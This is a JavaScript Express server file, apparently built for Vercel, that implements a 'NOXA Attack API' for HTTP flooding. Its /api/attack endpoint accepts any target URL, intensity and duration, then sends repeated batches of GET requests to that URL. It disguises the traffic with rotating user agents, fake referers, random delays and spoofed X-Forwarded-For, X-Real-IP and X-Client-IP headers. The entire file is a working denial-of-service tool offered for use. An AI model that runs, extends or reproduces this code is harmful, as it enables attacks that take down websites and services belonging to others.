const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(express.json());
app.use(require('cors')());

// In-memory store untuk Vercel Serverless
const attacks = new Map();

// User Agents Database
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
];

// Referers
const referers = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://www.youtube.com/',
    'https://www.twitter.com/',
    'https://www.reddit.com/'
];

// Generate random IP
function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// Make stealth request tanpa proxy
async function makeRequest(targetUrl) {
    try {
        // Random delay untuk human-like
        await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500));
        
        const headers = {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': referers[Math.floor(Math.random() * referers.length)],
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': generateRandomIP(),
            'X-Real-IP': generateRandomIP(),
            'X-Client-IP': generateRandomIP()
        };

        const response = await axios.get(targetUrl, {
            headers,
            timeout: 8000,
            maxRedirects: 2,
            validateStatus: () => true // Accept semua status code
        });
        
        return {
            success: true,
            status: response.status,
            userAgent: headers['User-Agent'].substring(0, 30)
        };
        
    } catch (error) {
        return {
            success: false,
            error: error.message
        };
    }
}

// POST /api/attack - Start attack
app.post('/api/attack', async (req, res) => {
    try {
        console.log('Attack request:', req.body);
        
        const { url, intensity = 30, duration = 30 } = req.body;
        
        if (!url || !url.startsWith('http')) {
            return res.status(400).json({ 
                success: false, 
                error: 'URL must start with http:// or https://' 
            });
        }
        
        const attackId = `noxa_${uuidv4().substring(0, 8)}`;
        const intensityNum = Math.min(Math.max(parseInt(intensity), 10), 100);
        const durationNum = Math.min(Math.max(parseInt(duration), 10), 300);
        
        // Simpan attack data
        const attackData = {
            id: attackId,
            url,
            intensity: intensityNum,
            startTime: Date.now(),
            endTime: Date.now() + (durationNum * 1000),
            requestsSent: 0,
            requestsSuccess: 0,
            requestsFailed: 0,
            active: true
        };
        
        attacks.set(attackId, attackData);
        
        // Start attack (async, tidak perlu wait)
        setTimeout(() => startAttack(attackId, url, intensityNum, durationNum), 100);
        
        res.json({
            success: true,
            attackId,
            message: `🚀 Attack launched against ${url}`,
            intensity: intensityNum,
            duration: durationNum,
            estimatedRequests: intensityNum * durationNum,
            monitorUrl: `/api/status?id=${attackId}`
        });
        
    } catch (error) {
        console.error('Attack endpoint error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// GET /api/attack - Info endpoint
app.get('/api/attack', (req, res) => {
    res.json({
        endpoint: 'NOXA Attack API',
        method: 'POST',
        parameters: {
            url: 'Target URL (required)',
            intensity: 'Requests per second (10-100)',
            duration: 'Duration in seconds (10-300)'
        },
        example: {
            url: 'https://example.com',
            intensity: 50,
            duration: 60
        }
    });
});

// Background attack function
async function startAttack(attackId, targetUrl, intensity, durationSeconds) {
    console.log(`[NOXA] Starting attack ${attackId} on ${targetUrl}`);
    
    const endTime = Date.now() + (durationSeconds * 1000);
    
    while (Date.now() < endTime) {
        const attackData = attacks.get(attackId);
        if (!attackData || !attackData.active) break;
        
        // Send batch requests
        const batchSize = Math.min(intensity, 20);
        const batchPromises = [];
        
        for (let i = 0; i < batchSize; i++) {
            batchPromises.push(makeRequest(targetUrl));
        }
        
        try {
            const results = await Promise.allSettled(batchPromises);
            
            // Update stats
            attackData.requestsSent += batchSize;
            attackData.requestsSuccess += results.filter(r => 
                r.status === 'fulfilled' && r.value.success
            ).length;
            attackData.requestsFailed += results.filter(r => 
                r.status === 'rejected' || (r.status === 'fulfilled' && !r.value.success)
            ).length;
            
            attacks.set(attackId, attackData);
            
        } catch (error) {
            console.error(`Batch error for ${attackId}:`, error.message);
        }
        
        // Rate limiting
        const delay = Math.max(50, 1000 / intensity);
        await new Promise(resolve => setTimeout(resolve, delay));
    }
    
    // Mark as completed
    const attackData = attacks.get(attackId);
    if (attackData) {
        attackData.active = false;
        attackData.completedAt = Date.now();
        attacks.set(attackId, attackData);
        
        console.log(`[NOXA] Attack ${attackId} completed. Requests: ${attackData.requestsSent}`);
    }
    
    // Auto cleanup setelah 10 menit
    setTimeout(() => {
        attacks.delete(attackId);
    }, 600000);
}

module.exports = app;
